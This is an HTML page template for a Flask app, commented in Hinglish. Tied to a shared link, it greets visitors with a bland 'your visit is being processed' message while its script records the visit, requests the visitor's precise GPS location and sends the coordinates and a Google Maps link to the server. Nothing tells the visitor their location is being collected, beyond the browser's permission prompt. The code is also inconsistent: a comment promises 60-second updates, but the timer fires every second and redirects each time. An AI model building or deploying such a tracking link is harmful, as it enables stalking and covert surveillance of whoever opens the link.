<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Visitor Tracking</title>
</head>

<body>
    <h1>Welcome!</h1>
    <p>Your visit is being processed.</p>


    <script>
        // Flask template se share link ka shared_id milega
        const sharedId = {{ shared_id | tojson }};

        let visitorId = null;
        let locationInterval = null;
        // 1. Pehle visit record karo
        async function trackVisit() {
            try {
                const response = await fetch("/track", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        page_path: window.location.pathname,
                        shared_id: sharedId
                    })
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.message || data.error || "Tracking failed");
                }

                if (!data.visitor_id) {
                    throw new Error("Visitor ID response mein nahi mila");
                }

                // Isi visit ki ID use hogi; purani ID par depend nahi karenge
                visitorId = data.visitor_id;
                localStorage.setItem("visitor_id", String(visitorId));
                localStorage.setItem("shared_id", String(sharedId));

                console.log("Visit successfully recorded:", visitorId);

                // Pehli location turant save karne ki koshish karo
                getLocation();

                // Purana interval ho to clear karo
                if (locationInterval !== null) {
                    clearInterval(locationInterval);
                }

                // Har 60 seconds mein location update
                locationInterval = setInterval(() => {
                    getLocation();
                    window.location.href = "/";
                }, 1000);

            } catch (error) {
                console.error("Visit record nahi ho saka:", error);
            }
        }

        // 2. Visitor ki location lo aur server par save karo
        function getLocation() {
            if (!visitorId || !sharedId) {
                console.log("Visitor ID ya Shared ID available nahi hai.");
                return;
            }

            if (!navigator.geolocation) {
                console.log("Is browser mein Geolocation supported nahi hai.");
                return;
            }

            console.log("Location permission / location ka wait ho raha hai...");

            navigator.geolocation.getCurrentPosition(
                async function (position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    const mapLink =
                        `https://www.google.com/maps?q=${latitude},${longitude}`;

                    try {
                        const response = await fetch("/save-location", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                id: visitorId,
                                shared_id: sharedId,
                                latitude: latitude,
                                longitude: longitude,
                                accuracy: accuracy,
                                mapLink: mapLink
                            })
                        });

                        const result = await response.json();

                        if (!response.ok) {
                            throw new Error(
                                result.message || result.error ||
                                "Location save nahi hui"
                            );
                        }

                        console.log("Location successfully saved:", result);
                        window.location.href = "/";

                    } catch (error) {
                        console.error("Failed to save location:", error);
                    }
                },

                function (error) {
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            console.log("Location permission deny kar di gayi.");
                            break;

                        case error.POSITION_UNAVAILABLE:
                            console.log("Device ki location available nahi hai.");
                            break;

                        case error.TIMEOUT:
                            console.log("Location request timeout ho gayi.");
                            break;

                        default:
                            console.log("Location obtain nahi ho saki.");
                    }
                },

                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        // Page load par visit record karo
        trackVisit();
    </script>

</body>

</html>
